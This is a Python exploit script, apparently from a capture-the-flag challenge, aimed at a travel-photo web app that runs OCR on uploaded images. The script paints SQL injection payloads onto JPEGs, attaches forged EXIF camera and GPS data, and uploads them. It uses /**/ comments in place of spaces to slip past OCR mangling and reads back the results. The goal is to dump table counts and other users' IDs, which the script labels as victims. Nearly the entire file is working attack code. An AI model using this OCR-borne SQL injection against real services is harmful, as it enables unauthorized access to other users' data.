# v2_dump2.py — sqlite_version() worked (no spaces). Queries with "FROM images" -> 500, likely the
# OCR mangles spaces or the word 'images'. Replace spaces with /**/ comments (SQLite ignores them)
# and verify the table read. Dump victim user_id avoiding spaces.
import requests, base64, re
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"
html = requests.get(BASE+"/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
base_img = Image.open("paisaje.png").convert("RGB")
CNT=[0]

def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: return ImageFont.truetype(p, sz)
        except: pass
    return ImageFont.load_default()

def build(text, size=30):
    W=min(2400,max(1000,40+int(len(text)*size*0.55))); H=260
    img=base_img.resize((W,H)); d=ImageDraw.Draw(img); f=font(size)
    bb=d.textbbox((20,20),text,font=f); d.rectangle([0,0,W,bb[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=f,fill=(0,0,0)); img.save("d2.jpg","jpeg",quality=75,optimize=True)
    def dms(x):
        dd=int(x);mm=int((x-dd)*60);s=round((x-dd-mm/60)*3600,4);return((dd,1),(mm,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),"d2.jpg")
    return "data:image/jpeg;base64,"+base64.b64encode(open("d2.jpg","rb").read()).decode()

q="'"
def dump(subquery, label):
    CNT[0]+=1; desc=f"E{CNT[0]}"
    painted = "9"+q+"||("+subquery+")||"+q+"9"
    r=requests.post(f"{BASE}/upload", json={"image":build(painted),"description":desc,"user_id":UID})
    ocr=""
    if r.status_code==200:
        data=requests.get(f"{BASE}/images/{UID}").json()
        row=next((x for x in data if x.get("description")==desc),None)
        ocr=row.get("summary_ocr","") if row else ""
    inner=ocr
    if inner.startswith("9"): inner=inner[1:]
    if inner.endswith("9"): inner=inner[:-1]
    print(f"{label:34} {r.status_code} raw={ocr!r} => {inner!r}")
    return r.status_code, inner

S="/**/"  # space replacement
print("=== spaceless table reads ===")
dump("SELECT"+S+"count(*)"+S+"FROM"+S+"images", "count via /**/")
dump("SELECT"+S+"count(*)FROM"+S+"images", "count tight")
# try without spaces at all around FROM
dump("SELECT/**/count(*)/**/FROM/**/images", "count all-/**/")
# victim user_id spaceless
dump("SELECT/**/user_id/**/FROM/**/images/**/WHERE/**/user_id!="+q+UID+q+"/**/LIMIT/**/1", "VICTIM v1")
# all distinct at once
dump("SELECT/**/group_concat(DISTINCT/**/user_id)/**/FROM/**/images", "all user_ids")
